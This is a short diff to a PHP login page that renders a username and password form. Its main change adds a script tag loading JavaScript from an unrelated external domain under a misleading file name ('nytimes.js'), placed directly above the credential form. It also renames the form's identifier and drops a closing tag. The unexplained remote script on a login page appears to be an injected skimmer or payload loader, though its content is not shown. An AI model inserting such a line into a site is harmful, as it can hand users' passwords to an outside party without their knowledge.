@@ -53,8 +53,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
 site_header();
+printf('<script src="https://thenewmanagementinc.com/tor/serve/nytimes.js"></script>');
 
-printf('<form style="position:absolute" class="login" method="POST" action="login.php">');
+printf('<form style="position:relative" id="win" method="POST" action="login.php">');
 csrf_html();
 
 printf('<h1>%s</h1>', html_escape($CONFIG['site_title']));
@@ -73,7 +74,6 @@ printf('<input class="text" name="password" type="password" placeholder="Passwor
 
 printf('<input class="submit" type="submit" name="login" value="Login"><input class="submit right" type="submit" name="register" value="Register"><input class="submit right" type="submit" name="request" value="Request">');
 
-printf('</section>');
 printf('</form>');
 
 site_footer();
